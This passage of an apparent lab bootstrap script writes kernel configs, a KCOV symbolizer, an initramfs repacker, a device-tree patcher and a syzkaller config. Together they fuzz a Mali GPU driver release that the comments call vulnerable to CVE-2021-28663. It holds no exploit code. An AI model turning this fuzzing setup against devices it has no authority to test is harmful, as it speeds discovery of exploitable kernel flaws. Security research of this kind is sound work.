# CONFIG_CRYPTO_DRBG_HASH is not set
# CONFIG_CRYPTO_DRBG_CTR is not set
CONFIG_CRYPTO_DRBG=y
CONFIG_CRYPTO_JITTERENTROPY=y
# CONFIG_CRYPTO_USER_API_HASH is not set
# CONFIG_CRYPTO_USER_API_SKCIPHER is not set
# CONFIG_CRYPTO_USER_API_RNG is not set
# CONFIG_CRYPTO_USER_API_AEAD is not set
CONFIG_CRYPTO_HASH_INFO=y
CONFIG_CRYPTO_HW=y
# CONFIG_CRYPTO_DEV_PADLOCK is not set
# CONFIG_CRYPTO_DEV_CCP is not set
# CONFIG_CRYPTO_DEV_QAT_DH895xCC is not set
# CONFIG_CRYPTO_DEV_QAT_C3XXX is not set
# CONFIG_CRYPTO_DEV_QAT_C62X is not set
# CONFIG_CRYPTO_DEV_QAT_DH895xCCVF is not set
# CONFIG_CRYPTO_DEV_QAT_C3XXXVF is not set
# CONFIG_CRYPTO_DEV_QAT_C62XVF is not set
# CONFIG_CRYPTO_DEV_NITROX_CNN55XX is not set
CONFIG_ASYMMETRIC_KEY_TYPE=y
CONFIG_ASYMMETRIC_PUBLIC_KEY_SUBTYPE=y
CONFIG_X509_CERTIFICATE_PARSER=y
CONFIG_PKCS7_MESSAGE_PARSER=y
# CONFIG_PKCS7_TEST_KEY is not set
# CONFIG_SIGNED_PE_FILE_VERIFICATION is not set

#
# Certificates for signature checking
#
CONFIG_SYSTEM_TRUSTED_KEYRING=y
CONFIG_SYSTEM_TRUSTED_KEYS=""
# CONFIG_SYSTEM_EXTRA_CERTIFICATE is not set
# CONFIG_SECONDARY_TRUSTED_KEYRING is not set
# CONFIG_SYSTEM_BLACKLIST_KEYRING is not set
CONFIG_BINARY_PRINTF=y

#
# Library routines
#
CONFIG_BITREVERSE=y
CONFIG_RATIONAL=y
CONFIG_GENERIC_STRNCPY_FROM_USER=y
CONFIG_GENERIC_STRNLEN_USER=y
CONFIG_GENERIC_NET_UTILS=y
CONFIG_GENERIC_FIND_FIRST_BIT=y
CONFIG_GENERIC_PCI_IOMAP=y
CONFIG_GENERIC_IOMAP=y
CONFIG_ARCH_USE_CMPXCHG_LOCKREF=y
CONFIG_ARCH_HAS_FAST_MULTIPLIER=y
CONFIG_CRC_CCITT=y
CONFIG_CRC16=y
# CONFIG_CRC_T10DIF is not set
# CONFIG_CRC_ITU_T is not set
CONFIG_CRC32=y
# CONFIG_CRC32_SELFTEST is not set
CONFIG_CRC32_SLICEBY8=y
# CONFIG_CRC32_SLICEBY4 is not set
# CONFIG_CRC32_SARWATE is not set
# CONFIG_CRC32_BIT is not set
# CONFIG_CRC64 is not set
# CONFIG_CRC4 is not set
# CONFIG_CRC7 is not set
# CONFIG_LIBCRC32C is not set
# CONFIG_CRC8 is not set
# CONFIG_RANDOM32_SELFTEST is not set
CONFIG_ZLIB_INFLATE=y
CONFIG_ZLIB_DEFLATE=y
CONFIG_LZO_COMPRESS=y
CONFIG_LZO_DECOMPRESS=y
CONFIG_LZ4_DECOMPRESS=y
CONFIG_XZ_DEC=y
CONFIG_XZ_DEC_X86=y
CONFIG_XZ_DEC_POWERPC=y
CONFIG_XZ_DEC_IA64=y
CONFIG_XZ_DEC_ARM=y
CONFIG_XZ_DEC_ARMTHUMB=y
CONFIG_XZ_DEC_SPARC=y
CONFIG_XZ_DEC_BCJ=y
# CONFIG_XZ_DEC_TEST is not set
CONFIG_DECOMPRESS_GZIP=y
CONFIG_DECOMPRESS_BZIP2=y
CONFIG_DECOMPRESS_LZMA=y
CONFIG_DECOMPRESS_XZ=y
CONFIG_DECOMPRESS_LZO=y
CONFIG_DECOMPRESS_LZ4=y
CONFIG_GENERIC_ALLOCATOR=y
CONFIG_INTERVAL_TREE=y
CONFIG_ASSOCIATIVE_ARRAY=y
CONFIG_HAS_IOMEM=y
CONFIG_HAS_IOPORT_MAP=y
CONFIG_HAS_DMA=y
CONFIG_NEED_SG_DMA_LENGTH=y
CONFIG_NEED_DMA_MAP_STATE=y
CONFIG_ARCH_DMA_ADDR_T_64BIT=y
CONFIG_DMA_DIRECT_OPS=y
CONFIG_SWIOTLB=y
CONFIG_SGL_ALLOC=y
CONFIG_IOMMU_HELPER=y
CONFIG_CHECK_SIGNATURE=y
CONFIG_CPU_RMAP=y
CONFIG_DQL=y
CONFIG_GLOB=y
# CONFIG_GLOB_SELFTEST is not set
CONFIG_NLATTR=y
CONFIG_CLZ_TAB=y
# CONFIG_CORDIC is not set
# CONFIG_DDR is not set
# CONFIG_IRQ_POLL is not set
CONFIG_MPILIB=y
CONFIG_OID_REGISTRY=y
CONFIG_UCS2_STRING=y
CONFIG_FONT_SUPPORT=y
# CONFIG_FONTS is not set
CONFIG_FONT_8x8=y
CONFIG_FONT_8x16=y
CONFIG_SG_POOL=y
CONFIG_ARCH_HAS_SG_CHAIN=y
CONFIG_ARCH_HAS_PMEM_API=y
CONFIG_ARCH_HAS_UACCESS_FLUSHCACHE=y
CONFIG_ARCH_HAS_UACCESS_MCSAFE=y
CONFIG_STACKDEPOT=y
CONFIG_SBITMAP=y
# CONFIG_STRING_SELFTEST is not set

#
# Kernel hacking
#

#
# printk and dmesg options
#
CONFIG_PRINTK_TIME=y
CONFIG_CONSOLE_LOGLEVEL_DEFAULT=7
CONFIG_CONSOLE_LOGLEVEL_QUIET=4
CONFIG_MESSAGE_LOGLEVEL_DEFAULT=4
# CONFIG_BOOT_PRINTK_DELAY is not set
# CONFIG_DYNAMIC_DEBUG is not set

#
# Compile-time checks and compiler options
#
# CONFIG_DEBUG_INFO is not set
CONFIG_ENABLE_MUST_CHECK=y
CONFIG_FRAME_WARN=2048
# CONFIG_STRIP_ASM_SYMS is not set
# CONFIG_READABLE_ASM is not set
# CONFIG_UNUSED_SYMBOLS is not set
# CONFIG_PAGE_OWNER is not set
CONFIG_DEBUG_FS=y
# CONFIG_HEADERS_CHECK is not set
# CONFIG_DEBUG_SECTION_MISMATCH is not set
CONFIG_SECTION_MISMATCH_WARN_ONLY=y
CONFIG_ARCH_WANT_FRAME_POINTERS=y
CONFIG_FRAME_POINTER=y
# CONFIG_STACK_VALIDATION is not set
# CONFIG_DEBUG_FORCE_WEAK_PER_CPU is not set
CONFIG_MAGIC_SYSRQ=y
CONFIG_MAGIC_SYSRQ_DEFAULT_ENABLE=0x1
CONFIG_MAGIC_SYSRQ_SERIAL=y
CONFIG_DEBUG_KERNEL=y

#
# Memory Debugging
#
# CONFIG_PAGE_EXTENSION is not set
# CONFIG_DEBUG_PAGEALLOC is not set
# CONFIG_PAGE_POISONING is not set
# CONFIG_DEBUG_PAGE_REF is not set
# CONFIG_DEBUG_RODATA_TEST is not set
# CONFIG_DEBUG_OBJECTS is not set
# CONFIG_SLUB_DEBUG_ON is not set
# CONFIG_SLUB_STATS is not set
CONFIG_HAVE_DEBUG_KMEMLEAK=y
# CONFIG_DEBUG_KMEMLEAK is not set
CONFIG_DEBUG_STACK_USAGE=y
CONFIG_DEBUG_VM=y
# CONFIG_DEBUG_VM_VMACACHE is not set
# CONFIG_DEBUG_VM_RB is not set
# CONFIG_DEBUG_VM_PGFLAGS is not set
CONFIG_ARCH_HAS_DEBUG_VIRTUAL=y
# CONFIG_DEBUG_VIRTUAL is not set
CONFIG_DEBUG_MEMORY_INIT=y
# CONFIG_DEBUG_PER_CPU_MAPS is not set
CONFIG_HAVE_DEBUG_STACKOVERFLOW=y
CONFIG_DEBUG_STACKOVERFLOW=y
CONFIG_HAVE_ARCH_KASAN=y
CONFIG_KASAN=y
# CONFIG_KASAN_EXTRA is not set
# CONFIG_KASAN_OUTLINE is not set
CONFIG_KASAN_INLINE=y
# CONFIG_TEST_KASAN is not set
CONFIG_ARCH_HAS_KCOV=y
CONFIG_CC_HAS_SANCOV_TRACE_PC=y
CONFIG_KCOV=y
# CONFIG_KCOV_ENABLE_COMPARISONS is not set
CONFIG_KCOV_INSTRUMENT_ALL=y
# CONFIG_DEBUG_SHIRQ is not set

#
# Debug Lockups and Hangs
#
# CONFIG_SOFTLOCKUP_DETECTOR is not set
CONFIG_HARDLOCKUP_CHECK_TIMESTAMP=y
# CONFIG_HARDLOCKUP_DETECTOR is not set
# CONFIG_DETECT_HUNG_TASK is not set
# CONFIG_WQ_WATCHDOG is not set
# CONFIG_PANIC_ON_OOPS is not set
CONFIG_PANIC_ON_OOPS_VALUE=0
CONFIG_PANIC_TIMEOUT=0
# CONFIG_SCHED_DEBUG is not set
CONFIG_SCHED_INFO=y
CONFIG_SCHEDSTATS=y
# CONFIG_SCHED_STACK_END_CHECK is not set
# CONFIG_DEBUG_TIMEKEEPING is not set

#
# Lock Debugging (spinlocks, mutexes, etc...)
#
CONFIG_LOCK_DEBUGGING_SUPPORT=y
# CONFIG_PROVE_LOCKING is not set
# CONFIG_LOCK_STAT is not set
# CONFIG_DEBUG_RT_MUTEXES is not set
# CONFIG_DEBUG_SPINLOCK is not set
# CONFIG_DEBUG_MUTEXES is not set
# CONFIG_DEBUG_WW_MUTEX_SLOWPATH is not set
# CONFIG_DEBUG_RWSEMS is not set
# CONFIG_DEBUG_LOCK_ALLOC is not set
# CONFIG_DEBUG_ATOMIC_SLEEP is not set
# CONFIG_DEBUG_LOCKING_API_SELFTESTS is not set
# CONFIG_LOCK_TORTURE_TEST is not set
# CONFIG_WW_MUTEX_SELFTEST is not set
CONFIG_STACKTRACE=y
# CONFIG_WARN_ALL_UNSEEDED_RANDOM is not set
# CONFIG_DEBUG_KOBJECT is not set
CONFIG_DEBUG_BUGVERBOSE=y
# CONFIG_DEBUG_LIST is not set
# CONFIG_DEBUG_PI_LIST is not set
# CONFIG_DEBUG_SG is not set
# CONFIG_DEBUG_NOTIFIERS is not set
# CONFIG_DEBUG_CREDENTIALS is not set

#
# RCU Debugging
#
# CONFIG_RCU_PERF_TEST is not set
# CONFIG_RCU_TORTURE_TEST is not set
CONFIG_RCU_CPU_STALL_TIMEOUT=21
CONFIG_RCU_TRACE=y
# CONFIG_RCU_EQS_DEBUG is not set
# CONFIG_DEBUG_WQ_FORCE_RR_CPU is not set
# CONFIG_DEBUG_BLOCK_EXT_DEVT is not set
# CONFIG_CPU_HOTPLUG_STATE_CONTROL is not set
# CONFIG_NOTIFIER_ERROR_INJECTION is not set
# CONFIG_FUNCTION_ERROR_INJECTION is not set
# CONFIG_FAULT_INJECTION is not set
# CONFIG_LATENCYTOP is not set
CONFIG_USER_STACKTRACE_SUPPORT=y
CONFIG_NOP_TRACER=y
CONFIG_HAVE_FUNCTION_TRACER=y
CONFIG_HAVE_FUNCTION_GRAPH_TRACER=y
CONFIG_HAVE_DYNAMIC_FTRACE=y
CONFIG_HAVE_DYNAMIC_FTRACE_WITH_REGS=y
CONFIG_HAVE_FTRACE_MCOUNT_RECORD=y
CONFIG_HAVE_SYSCALL_TRACEPOINTS=y
CONFIG_HAVE_FENTRY=y
CONFIG_HAVE_C_RECORDMCOUNT=y
CONFIG_TRACE_CLOCK=y
CONFIG_RING_BUFFER=y
CONFIG_EVENT_TRACING=y
CONFIG_CONTEXT_SWITCH_TRACER=y
CONFIG_TRACING=y
CONFIG_GENERIC_TRACER=y
CONFIG_TRACING_SUPPORT=y
CONFIG_FTRACE=y
# CONFIG_FUNCTION_TRACER is not set
# CONFIG_PREEMPTIRQ_EVENTS is not set
# CONFIG_IRQSOFF_TRACER is not set
# CONFIG_SCHED_TRACER is not set
# CONFIG_HWLAT_TRACER is not set
# CONFIG_FTRACE_SYSCALLS is not set
# CONFIG_TRACER_SNAPSHOT is not set
CONFIG_BRANCH_PROFILE_NONE=y
# CONFIG_PROFILE_ANNOTATED_BRANCHES is not set
# CONFIG_PROFILE_ALL_BRANCHES is not set
# CONFIG_STACK_TRACER is not set
CONFIG_BLK_DEV_IO_TRACE=y
CONFIG_KPROBE_EVENTS=y
CONFIG_UPROBE_EVENTS=y
CONFIG_PROBE_EVENTS=y
# CONFIG_FTRACE_STARTUP_TEST is not set
# CONFIG_MMIOTRACE is not set
# CONFIG_HIST_TRIGGERS is not set
# CONFIG_TRACEPOINT_BENCHMARK is not set
# CONFIG_RING_BUFFER_BENCHMARK is not set
# CONFIG_RING_BUFFER_STARTUP_TEST is not set
# CONFIG_PREEMPTIRQ_DELAY_TEST is not set
# CONFIG_TRACE_EVAL_MAP_FILE is not set
CONFIG_PROVIDE_OHCI1394_DMA_INIT=y
# CONFIG_DMA_API_DEBUG is not set
CONFIG_RUNTIME_TESTING_MENU=y
# CONFIG_LKDTM is not set
# CONFIG_TEST_LIST_SORT is not set
# CONFIG_TEST_SORT is not set
# CONFIG_KPROBES_SANITY_TEST is not set
# CONFIG_BACKTRACE_SELF_TEST is not set
# CONFIG_RBTREE_TEST is not set
# CONFIG_INTERVAL_TREE_TEST is not set
# CONFIG_PERCPU_TEST is not set
# CONFIG_ATOMIC64_SELFTEST is not set
# CONFIG_TEST_HEXDUMP is not set
# CONFIG_TEST_STRING_HELPERS is not set
# CONFIG_TEST_KSTRTOX is not set
# CONFIG_TEST_PRINTF is not set
# CONFIG_TEST_BITMAP is not set
# CONFIG_TEST_BITFIELD is not set
# CONFIG_TEST_UUID is not set
# CONFIG_TEST_OVERFLOW is not set
# CONFIG_TEST_RHASHTABLE is not set
# CONFIG_TEST_HASH is not set
# CONFIG_TEST_IDA is not set
# CONFIG_TEST_LKM is not set
# CONFIG_TEST_USER_COPY is not set
# CONFIG_TEST_BPF is not set
# CONFIG_FIND_BIT_BENCHMARK is not set
# CONFIG_TEST_FIRMWARE is not set
# CONFIG_TEST_SYSCTL is not set
# CONFIG_TEST_UDELAY is not set
# CONFIG_TEST_STATIC_KEYS is not set
# CONFIG_TEST_KMOD is not set
# CONFIG_MEMTEST is not set
# CONFIG_BUG_ON_DATA_CORRUPTION is not set
# CONFIG_SAMPLES is not set
CONFIG_HAVE_ARCH_KGDB=y
# CONFIG_KGDB is not set
CONFIG_ARCH_HAS_UBSAN_SANITIZE_ALL=y
# CONFIG_UBSAN is not set
CONFIG_ARCH_HAS_DEVMEM_IS_ALLOWED=y
CONFIG_STRICT_DEVMEM=y
# CONFIG_IO_STRICT_DEVMEM is not set
CONFIG_TRACE_IRQFLAGS_SUPPORT=y
CONFIG_EARLY_PRINTK_USB=y
CONFIG_X86_VERBOSE_BOOTUP=y
CONFIG_EARLY_PRINTK=y
CONFIG_EARLY_PRINTK_DBGP=y
# CONFIG_EARLY_PRINTK_EFI is not set
# CONFIG_EARLY_PRINTK_USB_XDBC is not set
# CONFIG_X86_PTDUMP is not set
# CONFIG_EFI_PGT_DUMP is not set
# CONFIG_DEBUG_WX is not set
CONFIG_DOUBLEFAULT=y
# CONFIG_DEBUG_TLBFLUSH is not set
CONFIG_HAVE_MMIOTRACE_SUPPORT=y
# CONFIG_X86_DECODER_SELFTEST is not set
CONFIG_IO_DELAY_TYPE_0X80=0
CONFIG_IO_DELAY_TYPE_0XED=1
CONFIG_IO_DELAY_TYPE_UDELAY=2
CONFIG_IO_DELAY_TYPE_NONE=3
CONFIG_IO_DELAY_0X80=y
# CONFIG_IO_DELAY_0XED is not set
# CONFIG_IO_DELAY_UDELAY is not set
# CONFIG_IO_DELAY_NONE is not set
CONFIG_DEFAULT_IO_DELAY_TYPE=0
CONFIG_DEBUG_BOOT_PARAMS=y
# CONFIG_CPA_DEBUG is not set
CONFIG_OPTIMIZE_INLINING=y
# CONFIG_DEBUG_ENTRY is not set
# CONFIG_DEBUG_NMI_SELFTEST is not set
CONFIG_X86_DEBUG_FPU=y
# CONFIG_PUNIT_ATOM_DEBUG is not set
# CONFIG_UNWINDER_ORC is not set
CONFIG_UNWINDER_FRAME_POINTER=y
__PL_25__
  sha256_pin "$LAB_ROOT/configs/lab_fuzz.config" "3a4824031bedae0918c9ae5e057cd06b439d23e760dc44b5de314c46d05ddba8"

  mkdir -p "$(dirname "$LAB_ROOT/configs/lab_fuzz_510.config")"
  cat > "$LAB_ROOT/configs/lab_fuzz_510.config" <<'__PL_26__'
# Fragment for kernels 5.x (Phase H) — appended to `make ARCH=<arch> defconfig`
# output before `olddefconfig`. Derived from the validated Phase C 4.19 config
# (builds/linux-4.19.320-r41p0/.config instrumentation block, lines 116/422/
# 3641) and checked against 5.10.30's arm64 defconfig + x86_64_defconfig:
#   - neither defconfig sets CONFIG_PM=y  -> PM/PM_DEVFREQ must be explicit
#     (MALI_DEVFREQ depends on the devfreq framework)
#   - arm64 defconfig carries CONFIG_DEBUG_INFO=y -> explicit not-set line
#     (last-wins through olddefconfig, empirically verified)
#   - arm64 defconfig has "# CONFIG_FTRACE is not set"
#   - KASAN_SHADOW_OFFSET is per-arch (arm64 defaults per VA_BITS) -> NOT set
#
# Arch/mode adjustments are applied by bootstrap after this file is appended:
#   MALI_MIDGARD        m -> y   if DRIVER_MODE=builtin        (sed)
#   MALI_PLATFORM_NAME  "devicetree" (arm64) / "vexpress" (x86_64)  (sed)
#   MALI_CSF_SUPPORT    # is not set -> =y if MALI_MODE=csf    (append+sed)
CONFIG_IKCONFIG=y
CONFIG_IKCONFIG_PROC=y
CONFIG_KASAN=y
CONFIG_KASAN_INLINE=y
# CONFIG_KASAN_OUTLINE is not set
CONFIG_KCOV=y
CONFIG_KCOV_INSTRUMENT_ALL=y
# CONFIG_KCOV_ENABLE_COMPARISONS is not set
CONFIG_FTRACE=y
# CONFIG_FUNCTION_TRACER is not set
# CONFIG_DEBUG_INFO is not set
CONFIG_KALLSYMS=y
CONFIG_PM=y
CONFIG_PM_DEVFREQ=y
CONFIG_DEVFREQ_GOV_SIMPLE_ONDEMAND=y
CONFIG_MALI_EXPERT=y
CONFIG_MALI_DEVFREQ=y
CONFIG_MALI_NO_MALI=y
CONFIG_MALI_MIDGARD=m
CONFIG_MALI_PLATFORM_NAME="devicetree"
# CONFIG_MALI_CSF_SUPPORT is not set
__PL_26__
  sha256_pin "$LAB_ROOT/configs/lab_fuzz_510.config" "b5f96ec3312caab317efe5dbf0c92598c18b498469f6d3e46d68f306b90edf90"

  mkdir -p "$(dirname "$LAB_ROOT/scripts/symbolize_kcov.py")"
  cat > "$LAB_ROOT/scripts/symbolize_kcov.py" <<'__PL_27__'
#!/usr/bin/env python3
"""symbolize_kcov.py — map raw KCOV PCs to kernel functions via the vmlinux
symbol table (works without CONFIG_DEBUG_INFO/DWARF; nokaslr builds only).

Usage: symbolize_kcov.py <vmlinux> <coverfile-or-dir> [output.txt]
Prints: total PCs, PCs in kbase (mali), per-function hit counts (top N).
"""
import bisect
import os
import subprocess
import sys


def load_syms(vmlinux):
    out = subprocess.run(["nm", "-n", vmlinux], capture_output=True, text=True,
                         check=True).stdout
    addrs, names = [], []
    for line in out.splitlines():
        f = line.split()
        if len(f) == 3 and f[1] in ("T", "t", "W"):
            addrs.append(int(f[0], 16))
            names.append(f[2])
    return addrs, names


def main():
    vmlinux, src = sys.argv[1], sys.argv[2]
    outpath = sys.argv[3] if len(sys.argv) > 3 else None
    files = []
    if os.path.isdir(src):
        files = [os.path.join(src, f) for f in sorted(os.listdir(src))]
    else:
        files = [src]
    addrs, names = load_syms(vmlinux)
    counts = {}
    total = 0
    for fn in files:
        if not os.path.isfile(fn):
            continue
        with open(fn) as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                pc = int(line, 16)
                i = bisect.bisect_right(addrs, pc) - 1
                if i < 0:
                    continue
                total += 1
                counts[names[i]] = counts.get(names[i], 0) + 1
    mali = {k: v for k, v in counts.items()
            if "kbase" in k or "mali" in k or "kcov" in k}
    lines = []
    lines.append(f"total PCs symbolized: {total}")
    lines.append(f"distinct functions: {len(counts)}")
    lines.append(f"distinct kbase/mali functions: {len(mali)}")
    lines.append(f"kbase/mali PC hits: {sum(mali.values())} "
                 f"({100.0 * sum(mali.values()) / max(total, 1):.1f}%)")
    lines.append("== top kbase/mali functions ==")
    for k, v in sorted(mali.items(), key=lambda kv: -kv[1])[:40]:
        lines.append(f"  {v:6d}  {k}")
    lines.append("== top functions overall ==")
    for k, v in sorted(counts.items(), key=lambda kv: -kv[1])[:20]:
        lines.append(f"  {v:6d}  {k}")
    text = "\n".join(lines) + "\n"
    print(text, end="")
    if outpath:
        with open(outpath, "w") as f:
            f.write(text)


if __name__ == "__main__":
    main()
__PL_27__
  sha256_pin "$LAB_ROOT/scripts/symbolize_kcov.py" "0e5d2b8be3b9fedd76d8d114e631dd5c20ca49eb1c57b7e775e05c0f93aca1d7"

  mkdir -p "$(dirname "$LAB_ROOT/scripts/repack_initrd.py")"
  cat > "$LAB_ROOT/scripts/repack_initrd.py" <<'__PL_28__'
#!/usr/bin/env python3
"""repack_initrd.py — pack a directory tree into a newc cpio with uid/gid forced
to 0 (kernel initramfs extraction honors archive uid/gid; we can't chown as a
regular user, so we write the headers directly)."""
import os, sys, struct

def pad4(b):
    return b + b"\0" * ((4 - len(b) % 4) % 4)

def entry(name, data=b"", mode=0o100644, ino=[1]):
    n = name.encode() + b"\0"
    # newc: magic(6) + 13 x 8-hex fields: ino mode uid gid nlink mtime filesize
    # devmajor devminor rdevmajor rdevminor namesize check
    hdr = b"070701" \
        + b"%08X" % ino[0] + b"%08X" % (mode & 0xffffffff) \
        + b"00000000" + b"00000000" + b"00000001" + b"00000000" \
        + b"%08X" % len(data) \
        + b"00000000" * 4 + b"%08X" % len(n) + b"00000000" + n
    ino[0] += 1
    return pad4(hdr) + pad4(data) if data else pad4(hdr)

def walk(src, out):
    # cpio order: dirs pre-order then files; kernel handles any order fine,
    # but parents must exist first. Trailer goes ONLY at the end (kernel stops
    # at the first TRAILER!!! it sees).
    items = []
    for root, dirs, files in os.walk(src):
        rel = os.path.relpath(root, src)
        rel = "" if rel == "." else rel
        for d in sorted(dirs):
            p = os.path.join(rel, d) if rel else d
            items.append((p, "dir"))
        for f in sorted(files):
            p = os.path.join(rel, f) if rel else f
            items.append((p, "file"))
    body = []
    for p, kind in items:
        full = os.path.join(src, p)
        if kind == "dir":
            body.append(entry("./" + p, mode=0o040755))
        else:
            st = os.lstat(full)
            if os.path.islink(full):
                tgt = os.readlink(full).encode()
                body.append(entry("./" + p, tgt, mode=0o120777))
            else:
                with open(full, "rb") as fh:
                    data = fh.read()
                mode = 0o100755 if st.st_mode & 0o111 else 0o100644
                body.append(entry("./" + p, data, mode=mode))
    # move trailer to the very end
    out.write(b"".join(body))
    out.write(entry("TRAILER!!!"))

if __name__ == "__main__":
    src, dst = sys.argv[1], sys.argv[2]
    import gzip
    with open(dst, "wb") as raw:
        # write uncompressed then compress via gzip for deterministic control
        import io
        buf = io.BytesIO()
        walk(src, buf)
        raw.write(gzip.compress(buf.getvalue(), 9))
    print("wrote", dst, os.path.getsize(dst), "bytes")
__PL_28__
  sha256_pin "$LAB_ROOT/scripts/repack_initrd.py" "20a8522b5ae70f531f3e45bdd63d406fd55fb78fb2f3e9691d03a5fa970209d2"

  mkdir -p "$(dirname "$LAB_ROOT/scripts/make_arm64_dtb.py")"
  cat > "$LAB_ROOT/scripts/make_arm64_dtb.py" <<'__PL_29__'
#!/usr/bin/env python3
"""make_arm64_dtb.py — insert the Mali gpu device-tree node into the
qemu-virt base DTB (Phase H, arm64 guide path).

Usage: make_arm64_dtb.py <virt_base.dts> <virt_mali.dts>

The node uses the guide's arm64 Mali platform values:
  compatible = "arm,mali-midgard"   (matches r36p0 kbase_dt_ids)
  reg        = <0x0 0x0d000000 0x0 0x200000>
               (verified-empty MMIO gap in qemu virt at -m 2048:
                devices occupy 0x0-0x8010000 (flash+GIC), 0x9000000-0x9031000
                (pl011/pl031/fw-cfg/pl061), 0xa000000-0xa004000 (32x0x200
                virtio_mmio), 0x10000000+ (PCI), 0x40000000+ (RAM))
  interrupts = <0 168 4> x3         (JOB/MMU/GPU; SPI 168 verified free —
                                     virt uses SPIs 0-46 for its devices)
Insertion point: first child of the soc node if the DT has one, else as the
first child of root (qemu <=10.2 virt dumps are flat: no soc node).
"""
import re
import sys


def main():
    if len(sys.argv) != 3:
        sys.exit(__doc__)
    src, dst = sys.argv[1], sys.argv[2]
    lines = open(src).read().splitlines(True)

    gpu_root = (
        "\tgpu@0d000000 {\n"
        '\t\tcompatible = "arm,mali-midgard";\n'
        "\t\treg = <0x0 0xd000000 0x0 0x200000>;\n"
        "\t\tinterrupts = <0x0 0xa8 0x4>, <0x0 0xa8 0x4>, <0x0 0xa8 0x4>;\n"
        '\t\tinterrupt-names = "JOB", "MMU", "GPU";\n'
        "\t};\n"
    )
    gpu_soc = gpu_root.replace("\n\t", "\n\t\t").replace("\tgpu@", "\t\tgpu@")

    out, done = [], False
    in_root = False
    for i, ln in enumerate(lines):
        out.append(ln)
        if done:
            continue
        if not in_root:
            if re.match(r"^/ \{", ln):
                in_root = True
            continue
        # preferred anchor: the soc node (newer qemu virt layouts)
        if re.match(r"^\tsoc \{$", ln.rstrip("\n")):
            out.append(gpu_soc)
            done = True
            continue
        # flat-root fallback: insert before the first child node so all
        # properties of root precede child nodes (DTSpec ordering)
        if re.match(r"^\t[A-Za-z0-9,_@.-]+.*\{$", ln.rstrip("\n")):
            out.pop()  # re-add after the gpu node
            out.append(gpu_root)
            out.append(ln)
            done = True
            continue
    if not done:
        sys.exit("make_arm64_dtb.py: no insertion point found (no soc node, no root children)")
    open(dst, "w").writelines(out)


if __name__ == "__main__":
    main()
__PL_29__
  sha256_pin "$LAB_ROOT/scripts/make_arm64_dtb.py" "01f1998d56a0f8de8120fd7d599b2e224c1f063328011d3d25c42abbac914ba6"

  mkdir -p "$(dirname "$LAB_ROOT/fuzzing/syzkaller/syz-r28p0-phase-f.cfg")"
  cat > "$LAB_ROOT/fuzzing/syzkaller/syz-r28p0-phase-f.cfg" <<'__PL_30__'
# syz-manager config — Phase F5: release-matched fuzzing of r28p0-01eac0 (JM) kbase
# VULNERABLE release of the CVE-2021-28663 vehicle. Same NO_MALI 4.19.320 tree as
# Phase E, driver swapped to r28p0 (see evidence/08, 09, 11). Descriptions:
# in-lab syzkaller copy with sys/linux/dev_mali_r28p0.txt (release-exact,
# const-cross-checked 116/116 vs C dumper, evidence/11).
# Read-only reuse: syz-builder.cpio / empty.img / syz-host.key from A-mali fuzz dir.
# sandbox=none: kernel has no CONFIG_USER_NS. enable_syscalls below = the r28p0
# surface only (the 5 r28p0-only ioctls included; r41p0-era KINSTR_*/PRIORITY/
# LIMITED_CORE_COUNT excluded since absent in this UAPI).
{
  "target": "linux/amd64",
  "syzkaller": "/home/za0x/kern_research/mali-uaf-lab/fuzzing/syzkaller/syzkaller-r41p0",
  "http": "127.0.0.1:56746",
  "workdir": "/home/za0x/kern_research/mali-uaf-lab/fuzzing/syzkaller/workdir-r28p0",
  "kernel_obj": "/home/za0x/kern_research/mali-uaf-lab/builds/linux-4.19.320-r41p0",
  "kernel_src": "/home/za0x/kern_research/mali-uaf-lab/builds/linux-4.19.320-r41p0",
  "image": "/home/za0x/Desktop/A-mali_kernel/qemu/fuzz/empty.img",
  "sshkey": "/home/za0x/Desktop/A-mali_kernel/qemu/fuzz/syz-host.key",
  "ssh_user": "root",
  "procs": 1,
  "sandbox": "none",
  "cover": true,
  "type": "qemu",
  "vm": {
    "count": 1,
    "cpu": 2,
    "mem": 2048,
    "kernel": "/home/za0x/kern_research/mali-uaf-lab/builds/linux-4.19.320-r41p0/arch/x86/boot/bzImage",
    "initrd": "/home/za0x/Desktop/A-mali_kernel/qemu/fuzz/syz-builder.cpio",
    "cmdline": "console=ttyS0 panic=-1 nokaslr"
  },
  "enable_syscalls": [
    "ioctl$KBASE_HWCNT_READER_CLEAR",
    "ioctl$KBASE_HWCNT_READER_DISABLE_EVENT",
    "ioctl$KBASE_HWCNT_READER_DUMP",
    "ioctl$KBASE_HWCNT_READER_ENABLE_EVENT",
    "ioctl$KBASE_HWCNT_READER_GET_API_VERSION",
    "ioctl$KBASE_HWCNT_READER_GET_API_VERSION_WITH_FEATURES",
    "ioctl$KBASE_HWCNT_READER_GET_BUFFER",
    "ioctl$KBASE_HWCNT_READER_GET_BUFFER_SIZE",
    "ioctl$KBASE_HWCNT_READER_GET_BUFFER_WITH_CYCLES",
    "ioctl$KBASE_HWCNT_READER_GET_HWVER",
    "ioctl$KBASE_HWCNT_READER_PUT_BUFFER",
    "ioctl$KBASE_HWCNT_READER_PUT_BUFFER_WITH_CYCLES",
    "ioctl$KBASE_HWCNT_READER_SET_INTERVAL",
    "ioctl$KBASE_IOCTL_DISJOINT_QUERY",
    "ioctl$KBASE_IOCTL_FENCE_VALIDATE",
    "ioctl$KBASE_IOCTL_GET_CONTEXT_ID",
    "ioctl$KBASE_IOCTL_GET_CPU_GPU_TIMEINFO",
    "ioctl$KBASE_IOCTL_GET_DDK_VERSION",
    "ioctl$KBASE_IOCTL_GET_GPUPROPS",
    "ioctl$KBASE_IOCTL_HWCNT_CLEAR",
    "ioctl$KBASE_IOCTL_HWCNT_DUMP",
    "ioctl$KBASE_IOCTL_HWCNT_ENABLE",
    "ioctl$KBASE_IOCTL_HWCNT_READER_SETUP",
    "ioctl$KBASE_IOCTL_HWCNT_SET",
    "ioctl$KBASE_IOCTL_JOB_SUBMIT",
    "ioctl$KBASE_IOCTL_MEM_ALIAS",
    "ioctl$KBASE_IOCTL_MEM_ALLOC",
    "ioctl$KBASE_IOCTL_MEM_COMMIT",
    "ioctl$KBASE_IOCTL_MEM_EXEC_INIT",
    "ioctl$KBASE_IOCTL_MEM_FIND_CPU_OFFSET",
    "ioctl$KBASE_IOCTL_MEM_FIND_GPU_START_AND_OFFSET",
    "ioctl$KBASE_IOCTL_MEM_FLAGS_CHANGE",
    "ioctl$KBASE_IOCTL_MEM_FREE",
    "ioctl$KBASE_IOCTL_MEM_IMPORT",
    "ioctl$KBASE_IOCTL_MEM_JIT_INIT",
